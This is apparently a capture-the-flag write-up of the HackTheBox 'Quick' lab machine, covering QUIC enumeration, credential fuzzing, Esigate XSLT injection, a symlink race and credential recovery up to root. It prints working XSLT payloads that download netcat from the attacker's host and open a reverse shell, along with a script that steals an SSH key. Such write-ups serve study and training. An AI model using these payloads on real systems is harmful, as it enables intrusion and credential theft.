---
title: "HackTheBox: Quick Writeup"
date: 2020-08-30 23:35:00 +0000
categories:
  - blog
tags:
  - CTF
  - HTB
  - English
---

Today's box is Quick from HackTheBox, the box is running linux and is rated as a hard box. Compromising this machine includes using a HTTP3/QUIC client to query a few pages, doing some targeted fuzzing, performing a XSLT-injection, abusing bad code together with bad acces-controls of the filesystem, to finally find cached credentials laying around. 

![Quick Info Card](https://jackhack.se/assets/images/quick/quick_info.png)
{: .full}
# Recon
~~~
# Nmap 7.80 scan initiated Sat Jul 25 14:54:02 2020 as: nmap -sV -p- -oA initial -T5 quick.htb
Warning: 10.10.10.186 giving up on port because retransmission cap hit (2).
Nmap scan report for quick.htb (10.10.10.186)
Host is up (0.050s latency).
Not shown: 65123 closed ports, 410 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 25 14:57:19 2020 -- 1 IP address (1 host up) scanned in 197.24 seconds
~~~
{: .language-bash}

Standard nmap scan doesn't give me much information, starting to enumerate the page behind port 9001 gives away some files.

~~~
┌──(kali@kali)-[~/boxes/quick]                                      
└─$ gobuster dir -u http://quick.htb:9001 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php                                                                                                                           
===============================================================                                                                                                                                                                            
Gobuster v3.0.1                                           
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                                                      
===============================================================                                                      
[+] Url:            http://quick.htb:9001                                                                            
[+] Threads:        10                                                                                               
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403                                                                      
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php                                   
[+] Timeout:        10s                                   
===============================================================                                                      
2020/08/30 08:28:45 Starting gobuster                                                                                
===============================================================                                                      
/index.php (Status: 200)                                  
/search.php (Status: 200)  
/home.php (Status: 200)         
/login.php (Status: 200)                                  
/clients.php (Status: 200)                                                                                                                                                                                                                 
/db.php (Status: 200)                                     
/ticket.php (Status: 200)                                 
Progress: 14180 / 220561 (6.43%)^C                   
[!] Keyboard interrupt detected, terminating.
===============================================================                                                      
2020/08/30 08:30:53 Finished               
===============================================================  
~~~

Visiting the **ticket.php** page gives a "Invalid credentials" pop-up, none of the other pages seems interesting. 

There is a link on the homepage to a portal page, however it is not browseable. And the text right next to it says 


>Update!
We are migrating our portal with latest TLS and HTTP support. To read more about our services, please navigate to our portal

>You might experience some connectivity issues during portal access which we are aware of and working on designing client application to provide better experience for our users. Till then you can avail our services from Mobile App

**Latest HTTP support** is the key here, searching google for "HTTP Latest version" got me to mozillas developer pages and [this timeline](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Evolution_of_HTTP) of the HTTP protocol

When i scrolled to the bottom of the page, i saw this mentioning HTTP3 that's not fully implemented yet, and will use another protocol developed by Google called **QUIC** - Thinking of the name of the box, this has to be a clue. 

# Foothold

To use HTTP3 i need a client capable of sending requests and presenting respones back to me, apparently some versions of  **cURL** has this functionality with the *--http3* flag, unfortunately the version that comes with Kali 2020.3 does not have this functionality, so once again going to Google for help, i found [this](https://github.com/cloudflare/quiche) HTTP3 client from Cloudflare

Following the instructions to build it, and the examples provided for running it:
~~~
┌──(kali@kali)-[~/boxes/quick]
└─$ git clone --recursive https://github.com/cloudflare/quiche

┌──(kali@kali)-[~/boxes/quick]
└─$ sudo apt install cargo

┌──(kali@kali)-[~/boxes/quick]
└─$ sudo apt install cmake

┌──(kali@kali)-[~/boxes/quick/quiche]
└─$ cargo build --examples
~~~
{: .language-bash}

~~~
┌──(kali@kali)-[~/boxes/quick/quiche]
└─$ cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify https://portal.quick.htb 

    Finished dev [unoptimized + debuginfo] target(s) in 0.11s                                                        
     Running `tools/apps/target/debug/quiche-client --no-verify 'https://portal.quick.htb'`                          
                                                          
<html>                                                                                                               
<title> Quick | Customer Portal</title>                                                                              
<h1>Quick | Portal</h1>                                                                                              
<head>                                                                                                               
<style>                                                   
ul {                                                                                                                 
  list-style-type: none;                                                                                             
  margin: 0;                                                                                                                                                                                                                               
  padding: 0;                                                                                                                                                                                                                              
  width: 200px;                                                                                                      
  background-color: #f1f1f1;                                                                                                                                                                                                               
}                                                                                                                    
                                                                                                                                                                                                                                           
li a {                                                    
  display: block;                                                                                                    
  color: #000;                                                                                                                                                                                                                             
  padding: 8px 16px;                                      
  text-decoration: none;                                                                                             
}                                                                                                                                                                                                                                          
                                                                                                                     
/* Change the link color on hover */                                                                                 
li a:hover {                                                                                                         
  background-color: #555;                                                                                            
  color: white;                                                                                                      
}                                                                                                                    
</style>                                                                                                             
</head>                                                                                                              
<body>                                     
<p> Welcome to Quick User Portal</p>                                                                                 
<ul>                                                                                                                 
  <li><a href="index.php">Home</a></li>                                                                              
  <li><a href="index.php?view=contact">Contact</a></li>                                                                                                                                                                                    
  <li><a href="index.php?view=about">About</a></li>                                                                  
  <li><a href="index.php?view=docs">References</a></li>                                                                                                                                                                                    
</ul>                                                                                                                
</html>
~~~
{: .language-bash}

So i am able to reach the portal page using the QUIC protocol. One page that catches my attention is the References-page containing documents. So i try to view it using the same technique. 

~~~
┌──(kali㉿kali)-[~/boxes/quick/quiche]
└─$ cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify https://portal.quick.htb/index.php?view=docs                                                                                                        
    Finished dev [unoptimized + debuginfo] target(s) in 0.10s                                                        
     Running `tools/apps/target/debug/quiche-client --no-verify 'https://portal.quick.htb/index.php?view=docs'`      
<!DOCTYPE html>                                           
<html>                                                                                                               
<head>                                                                                                               
<meta name="viewport" content="width=device-width, initial-scale=1">                                                 
                                                                                                                                                                                                                                           
<h1>Quick | References</h1>                                                                                          
<ul>                                                                                                                                                                                                                                       
  <li><a href="docs/QuickStart.pdf">Quick-Start Guide</a></li>                                                       
  <li><a href="docs/Connectivity.pdf">Connectivity Guide</a></li>                                                    
</ul>                                                     
</head>                                                   
</html>   
~~~
{: .language-bash}

I download both PDF's by just appending the output to a pdf-file.

~~~
┌──(kali㉿kali)-[~/boxes/quick/quiche]
└─$ cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify https://portal.quick.htb/docs/Connectivity.pdf >> connectivity.pdf

┌──(kali㉿kali)-[~/boxes/quick/quiche]
└─$ cargo run --manifest-path=tools/apps/Cargo.toml --bin quiche-client -- --no-verify https://portal.quick.htb/docs/QuickStart.pdf >> quickstart.pdf
~~~
{: .language-bash}


The Connectivity PDF contains a password and some instructions to reach the ticketing-system for customers.

![PDF](https://jackhack.se/assets/images/quick/Connectivity_pdf.png)
{: .full}
This part took me like litteraly a whole day to figure out, since there was a few clients listed on the homepage i used these to build a wordlist to use together with the recently found password for accessing the ticket-system. 

I had no luck with that, since the login-page mentions "email" instead of "username" i suspected that i needed a full username like *user@company.tld*, i grabbed all usernames and the corresponding company name together with the [country-top level domains](https://en.wikipedia.org/wiki/List_of_Internet_top-level_domains) that was specified on the *clients.php* page and made a wordlist from these.
(Probably this part should be scripted :))

![User List](https://jackhack.se/assets/images/quick/userslist.png)
{: .full}
Running wfuzz to quickly test all users i found one that got a 302 Redirect when logging in. 

~~~
┌──(kali@kali)-[~/boxes/quick]
└─$ wfuzz -X POST -u http://portal.quick.htb:9001/login.php -d  'email=FUZZ&password=Quick4cc3$$' -w users.txt -c


********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://portal.quick.htb:9001/login.php
Total requests: 8

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000005:   200        0 L      2 W      80 Ch       "Tim@qconsulting.co.uk"
000000006:   200        0 L      2 W      80 Ch       "Roy@darkwing.com"                                                  
000000003:   200        0 L      2 W      80 Ch       "Elisa"       
000000008:   200        0 L      2 W      80 Ch       "James@lazycoop.cn"
000000002:   200        0 L      2 W      80 Ch       "Roy"         
000000007:   302        0 L      0 W      0 Ch        "Elisa@wink.co.uk"                                                  
000000001:   200        0 L      2 W      80 Ch       "Tim"         
000000004:   200        0 L      2 W      80 Ch       "James"       
~~~
{: .language-bash}

# User

Moving on to check out the ticketing system i tested a few things, like raising new tickets and searching for old tickets, nothing interesting was found. I fired up Burp Suite and started checking the requests, in the response to a standard GET request i caught my eye on the header X-Powered-By.

![Esigate](https://jackhack.se/assets/images/quick/esigate.png)
{: .full}
A quick google search shows that there is a few [exploits](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) in Esigate leading to Remote Code Execution, in this case i will use XSLT injections. 

The exploitation phase will consist of three stages:

- Uploading a netcat binary
- Making the binary runable (chmod +x)
- Executing netcat to connect to my reverse shell listener

Therefore, i have to make 3 XML files and 3 XSL files, how ever the XML files can be empty but for some reason this web application want's unique filenames so i could not use the same empty XML file for all three requests.

**nc.xsl**
~~~
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[wget http://10.10.14.40/nc]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
~~~

**chmod.xsl**
~~~
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[chmod +x nc]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>

~~~
**shell.xsl**
~~~
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="xml" omit-xml-declaration="yes"/>
<xsl:template match="/"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
<root>
<xsl:variable name="cmd"><![CDATA[./nc -e /bin/bash 10.10.14.40 9001 ]]></xsl:variable>
<xsl:variable name="rtObj" select="rt:getRuntime()"/>
<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
Process: <xsl:value-of select="$process"/>
Command: <xsl:value-of select="$cmd"/>
</root>
</xsl:template>
</xsl:stylesheet>
~~~

I will serve the XML,XSL and the nc binary via a simple python webserver

~~~
┌──(kali@kali)-[~/boxes/quick]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~
{: .language-bash}

And each of the tickets will look like this
![XSL Injection](https://jackhack.se/assets/images/quick/xsl.png)
{: .full}
After sending this three requests, and visiting the corresponding ticket numbers, i got a shell as user sam and got the user flag. 
![User Flag](https://jackhack.se/assets/images/quick/userflag.png)
{: .full}
# Root

Adding my ssh key to *sam's* ~~~ ~/.ssh/authorized_keys ~~~ to upgrade my shell i start manually enumerating the box. I can tell there is another user on the box called *srvadm*, i want to check if that username is mentioned in any files readable by the user *sam*

Running this **grep** oneliner will search all files for the username & hide all errors.

~~~
sam@quick:~$ grep -Ril "srvadm" / 2>/dev/null
/var/log/wtmp
/var/log/journal/fa1cd4f8d4cc49749c8ebb21ffe43ebe/user-1000@ee730b65c5874435ba52fb750e65b4b3-00000000000007da-0005a13f4518b4ce.journal
/var/www/printer/index.php
~~~
{: .language-bash}

The folder inside */www/* called printer looks interesting, by checking the */etc/apache2/sites-enabled/* directory i can see that there's another undiscovered webpage called "printerv2.quick.htb" listening on port 80 

![Apache config file](https://jackhack.se/assets/images/quick/printv2.png)
{: .full}
By making a new SSH connection and port forwarding port 80 on the victim machine to my kali, i can check out the page on my local machine. 

~~~
┌──(kali@kali)-[~/boxes/quick]
└─$ sudo ssh sam@quick.htb -i sam_rsa -L 80:127.0.0.1:80
~~~
{: .language-bash}
Adding the domain to my */etc/hosts* file and checking it out:

![Printer page](https://jackhack.se/assets/images/quick/printer_page.png)
{: .full}
I got stuck here for a while aswell, but by carefully enumerating enough i finally found some database-credentials in a file called db.php located in */var/www/html*

~~~
sam@quick:/var/www/html$ ls
clients.php  db.php  home.php  index.php  login.php  search.php  ticket.php
sam@quick:/var/www/html$ cat db.php
<?php
$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
?>
sam@quick:/var/www/html$
~~~
{: .language-bash}

Connecting to the database and dumping the users table:

~~~
sam@quick:/var/www/html$ mysql -h localhost -u db_adm -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 55
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| quick              |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

mysql> use quick
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_quick |
+-----------------+
| jobs            |
| tickets         |
| users           |
+-----------------+
3 rows in set (0.00 sec)

mysql> select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)

mysql> 

~~~
{: .language-bash}

Instead of cracking the hash, i set the password to the same as Elisa's wich we know from the PDF erlier.
~~~
mysql> Update users SET password="c6c35ae1f3cb19438e0199cfa72a9d9d" where name="Server Admin";
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0

mysql> select * from users;
+--------------+------------------+----------------------------------+
| name         | email            | password                         |
+--------------+------------------+----------------------------------+
| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
| Server Admin | srvadm@quick.htb | c6c35ae1f3cb19438e0199cfa72a9d9d |
+--------------+------------------+----------------------------------+
2 rows in set (0.00 sec)

~~~
{: .language-bash}

Now i was able to login to the printerv2-page, and discover a page with basic functionality to add a printer and print on it. Looking in the */var/www/printer/* directory, i find a file called *job.php* 
I added comments to the relevant lines in the snippet below.

~~~
---snip---
if($_SESSION["loggedin"])                                                                                            
{                                                                                                                    
        if(isset($_POST["submit"]))                 
        {                                       
                $title=$_POST["title"];        
                $file = date("Y-m-d_H:i:s");   # Creates a file named the current date and time
                file_put_contents("/var/www/jobs/".$file,$_POST["desc"]); # Puts the file in the directory /var/www/jobs
                chmod("/var/www/printer/jobs/".$file,"0777");  # Gives full rwx-rights to all users before printing it                                                      
                $stmt=$conn->prepare("select ip,port from jobs");                                                    
                $stmt->execute();    
                
    ---snip---
~~~
{: .language-php}

I create a new "printer" located at my ip-adress, and open a netcat listener on the port i specify in the web-ui.
![Create Printer](https://jackhack.se/assets/images/quick/create_printer.png)
{: .full}
Then i try to print something by visiting **job.php**, and it get's reflected in my netcat listener:

![Test-print 1]https://jackhack.se/assets/images/quick/(testprint_1.png)
{: .full}
~~~
┌──(kali@kali)-[~/boxes/quick]
└─$ nc -lvnp 9005        
listening on [any] 9005 ...
connect to [10.10.14.40] from (UNKNOWN) [10.10.10.186] 46916
testprintVA  
~~~
{: .language-bash}


As my current user **sam** has full rights to the directory */var/www/jobs* i should be able to symlink the file created by **job.php** to the user *srvadm*'s private ssh-key and output it in my netcat listener.

~~~
sam@quick:/var/www$ ls -la
drwxr-xr-x  5 root root 4096 Mar 21 03:07 .
drwxr-xr-x 14 root root 4096 Mar 20 02:10 ..
drwxr-xr-x  2 root root 4096 Mar 20 03:48 html
drwxrwxrwx  2 root root 4096 Aug 30 12:00 jobs
drwxr-xr-x  6 root root 4096 Mar 21 03:08 printer
~~~
{: .language-bash}

To do that as quicky as needed, i wrote a small bash script.

~~~
#!/bin/bash
cd  /var/www/jobs;
while true;
do
	for FILE in $(ls);
	do
		rm -f $FILE;
		ln -s /home/srvadm/.ssh/id_rsa $FILE;
	done
done
~~~
{: .language-bash}

Putting this into a script, executing it and printing a job at *printerv2.quick.htb/job.php* gives me the private SSH-key of the user **srvadm**

~~~
sam@quick:/var/www$ cd /tmp
sam@quick:/tmp$ nano linkscript.sh
sam@quick:/tmp$ chmod +x linkscript.sh 
sam@quick:/tmp$ ./linkscript.sh 
~~~
{: .language-bash}
![RSA-Key](https://jackhack.se/assets/images/quick/rsa_key.png)
{: .full}
Logging in to **srvadm** using this key works fine, and from here on the root part was really easy:

~~~
┌──(kali@kali)-[~/boxes/quick]
└─$ ssh srvadm@quick.htb -i id_rsa

Last login: Fri Mar 20 05:56:02 2020 from 172.16.118.129
srvadm@quick:~$ 
~~~
{: .language-bash}

In the **srvadm** home directory, there is a folder called *cache.d*, containing interesting files. One of them contains a password which i suspect is the root-password:

~~~
srvadm@quick:~$ ls -la                                              
total 36                                                            
drwxr-xr-x 6 srvadm srvadm 4096 Mar 20 06:37 .                      
drwxr-xr-x 4 root   root   4096 Mar 20 02:16 ..                     
lrwxrwxrwx 1 srvadm srvadm    9 Mar 20 02:38 .bash_history -> /dev/null                                                           
-rw-r--r-- 1 srvadm srvadm  220 Mar 20 02:16 .bash_logout           
-rw-r--r-- 1 srvadm srvadm 3771 Mar 20 02:16 .bashrc                
drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 .cache                 
drwx------ 3 srvadm srvadm 4096 Mar 20 02:38 .gnupg                 
drwxrwxr-x 3 srvadm srvadm 4096 Mar 20 06:37 .local                 
-rw-r--r-- 1 srvadm srvadm  807 Mar 20 02:16 .profile               
drwx------ 2 srvadm srvadm 4096 Mar 20 02:38 .ssh
srvadm@quick:~$ cd .cache/              
srvadm@quick:~/.cache$ ls                                           
conf.d  logs  motd.legal-displayed  packages
srvadm@quick:~/.cache$ cd conf.d/                 
srvadm@quick:~/.cache/conf.d$ ls
cupsd.conf  printers.conf         
srvadm@quick:~/.cache/conf.d$ cat printers.conf
# Printer configuration file for CUPS v2.3.0
# Written by cupsd on 2020-02-18 17:11
# DO NOT EDIT THIS FILE WHEN CUPSD IS RUNNING
---snip---
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer                                   
State Idle                                  
StateTime 1549274624                              
ConfigTime 1549274625
---snip---
~~~
{: .language-bash}

The **DeviceUri** string looks like it contains credentials, by URL-decoding it it decodes to:
~~~
https://srvadm@quick.htb:&ftQ4K3SGde8?@printerv3.quick.htb/printer
~~~
The password for the root account is **&ftQ4K3SGde8?**

~~~
srvadm@quick:~$ su root
Password: &ftQ4K3SGde8?
root@quick:/home/srvadm# cd
root@quick:~# cat root.txt 
01ed--------------------0c214
root@quick:~# 
~~~
{: .language-bash}

